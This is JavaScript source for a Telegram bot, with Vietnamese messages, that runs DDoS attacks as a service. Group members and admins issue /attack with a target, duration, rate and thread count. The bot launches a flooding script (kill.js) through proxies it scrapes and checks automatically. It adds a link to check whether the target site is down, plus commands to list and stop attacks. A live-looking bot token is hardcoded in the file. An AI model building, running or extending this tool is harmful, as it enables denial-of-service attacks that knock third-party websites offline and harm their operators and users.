const TelegramBot = require('node-telegram-bot-api')
const { spawn } = require('child_process')
const express = require('express')
const si = require('systeminformation')
const fs = require('fs').promises
const axios = require('axios')

const TOKEN = '7937745403:AAGrQ_OVQalmt2tzz6XJBtDDcD-YN-gATu8'
const ADMIN_IDS = [6601930239]
const GROUP_USERNAME = 'deptraiaiyeu'
const bot = new TelegramBot(TOKEN, { polling: true })

const app = express()
const PORT = process.env.PORT || 3000
app.get('/', (req, res) => res.send('Bot is running'))
app.listen(PORT, () => console.log(`Listening on port ${PORT}`))

const activeAttacks = {}
const PROXY_FILE = './prx.txt'
const MIN_PROXIES = 240

async function checkProxy(proxy) {
  try {
    const [ip, port] = proxy.split(':')
    if (!ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) || isNaN(port)) return false
    const response = await axios.get('https://api.ipify.org', {
      proxy: { host: ip, port: parseInt(port) },
      timeout: 5000
    })
    return response.status === 200
  } catch {
    return false
  }
}

async function fetchProxies() {
  const sources = [
    'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text',
    'https://openproxylist.xyz/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
  ]
  let proxies = []
  for (const source of sources) {
    try {
      const response = await axios.get(source, { timeout: 10000 })
      const lines = response.data.split('\n').map(line => line.trim()).filter(line => line.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/))
      proxies.push(...lines)
    } catch {}
  }
  return [...new Set(proxies)]
}

async function scanProxies(chatId) {
  bot.sendMessage(chatId, 'Tiến hành kiểm tra nghiêm ngặt các proxy. ⚡\n-> Giữ proxy sống\n-> Vứt proxy chết', { parse_mode: 'Markdown' })
  
  let proxies = []
  try {
    const data = await fs.readFile(PROXY_FILE, 'utf8')
    proxies = data.split('\n').map(line => line.trim()).filter(line => line.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/))
  } catch {
    proxies = []
  }

  const total = proxies.length
  const results = await Promise.all(proxies.map(proxy => checkProxy(proxy)))
  const liveProxies = proxies.filter((_, i) => results[i])
  const liveCount = liveProxies.length

  let finalProxies = liveProxies
  if (liveCount < MIN_PROXIES) {
    bot.sendMessage(chatId, `Proxy sống dưới ${MIN_PROXIES} (${liveCount}). Tiến hành lấy và kiểm tra proxy mới... ⚡`, { parse_mode: 'Markdown' })
    const newProxies = await fetchProxies()
    const newResults = await Promise.all(newProxies.map(proxy => checkProxy(proxy)))
    const newLiveProxies = newProxies.filter((_, i) => newResults[i])
    finalProxies = [...new Set([...liveProxies, ...newLiveProxies])]
  }

  const finalCount = finalProxies.length
  finalProxies = finalProxies.slice(0, Math.max(MIN_PROXIES, finalCount))
  await fs.writeFile(PROXY_FILE, finalProxies.join('\n'))
  
  const deadCount = total - liveCount
  const livePercent = finalCount > 0 ? (finalCount / finalCount * 100).toFixed(2) : 0

  bot.sendMessage(chatId, 
    `Tổng số proxy trong file ${PROXY_FILE}: ${finalCount}\n` +
    `-> Số proxy sống: ${finalCount}/${finalCount}\n` +
    `-> Số proxy chết: ${deadCount}/${total || deadCount}\n\n` +
    `Sẵn sàng cho lần tấn công tiếp theo với các proxy sống đến ${livePercent}%. ✅`, 
    { parse_mode: 'Markdown' }
  )
}

setInterval(() => scanProxies(ADMIN_IDS[0]), 3600000)

bot.onText(/\/system/, async (msg) => {
  const chatId = msg.chat.id
  try {
    const cpu = await si.cpu()
    const mem = await si.mem()
    const disk = await si.fsSize()
    const os = await si.osInfo()
    const diskInfo = disk.length > 0 ? disk[0] : { fs: 'N/A', size: 0, used: 0 }
    const systemInfo = {
      OS: `${os.distro} ${os.release} (${os.arch})`,
      CPU: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
      RAM: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
      Disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`
    }
    bot.sendMessage(chatId, '```json\n' + JSON.stringify(systemInfo, null, 2) + '\n```', { parse_mode: 'Markdown' })
  } catch (err) {
    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }
})

bot.onText(/\/scanproxy/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  if (!ADMIN_IDS.includes(userId)) {
    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: "Permission denied" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    return
  }
  await scanProxies(chatId)
})

bot.on('message', (msg) => {
  const id = msg.chat.id
  const text = msg.text?.trim()
  const userId = msg.from.id
  const username = msg.from.username || 'concho'

  if (!text) return

  const isFromAllowedGroup = msg.chat.type === 'supergroup' && msg.chat.username === GROUP_USERNAME
  const isAdmin = ADMIN_IDS.includes(userId)

  if (!isFromAllowedGroup && !isAdmin) return

  if (text.startsWith('/attack')) {
    const args = text.split(/\s+/).slice(1)
    if (args.length !== 4) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/attack [target] [time] [rate] [thread]" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }

    const [target, timeStr, rate, thread] = args
    const time = parseInt(timeStr)

    if (!target || isNaN(time) || isNaN(parseInt(rate)) || isNaN(parseInt(thread))) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Invalid arguments" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }

    if (!isAdmin && time > 60) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Attack time must be ≤ 60 seconds" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }

    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, PROXY_FILE])
    const attackId = `${userId}_${Date.now()}`
    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId }

    const response = {
      status: "Attack Started!",
      target,
      time,
      rate,
      thread,
      caller: username,
      index: attackId
    }

    bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Check Website 🔍',
              url: `https://check-host.net/check-http?host=${target}`
            }
          ]
        ]
      }
    })

    cmd.on('error', (err) => {
      delete activeAttacks[attackId]
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    })

    cmd.on('close', (code) => {
      delete activeAttacks[attackId]
      bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code, target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    })
  }

  if (text === '/list') {
    const list = Object.entries(activeAttacks)
      .filter(([_, v]) => isAdmin || v.userId === userId)
      .map(([key, v], i) => ({
        index: key,
        target: v.target,
        time: v.time,
        rate: v.rate,
        thread: v.thread
      }))
    bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }

  if (text.startsWith('/stop')) {
    const args = text.split(/\s+/).slice(1)
    if (args.length !== 1) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/stop <index>" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    const key = args[0]
    const attack = activeAttacks[key]
    if (!attack) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Not found" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    if (!isAdmin && attack.userId !== userId) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Permission denied" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }
    attack.cmd.kill()
    delete activeAttacks[key]
    bot.sendMessage(id, '```json\n' + JSON.stringify({ stopped: true, target: attack.target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }
})

bot.on('polling_error', (err) => console.error(err.message))
